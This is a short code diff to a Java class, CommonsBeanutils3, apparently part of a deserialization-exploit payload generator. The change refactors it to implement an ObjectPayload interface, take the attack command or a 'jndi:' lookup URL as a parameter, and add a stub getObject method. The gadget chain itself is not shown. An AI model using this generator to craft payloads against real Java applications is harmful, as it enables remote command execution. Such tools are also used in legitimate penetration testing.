@@ -10,11 +10,11 @@ import java.io.ObjectOutputStream;
 import java.math.BigInteger;
 import java.util.PriorityQueue;
 
-public class CommonsBeanutils3 {
+public class CommonsBeanutils3 implements ObjectPayload<Object> {
 
-    public static byte[] getBytes(PayloadType type) throws Exception {
+    public byte[] getBytes(PayloadType type, String... param) throws Exception {
         String jndiURL;
-        String command = String.valueOf(type);
+        String command = param[0];
         if (command.toLowerCase().startsWith("jndi:")) {
             jndiURL = command.substring(5);
         } else {
@@ -42,5 +42,10 @@ public class CommonsBeanutils3 {
         oos.close();
 
         return bytes;
+    }
+
+    @Override
+    public Object getObject(String command) throws Exception {
+        return null;
     }
 }
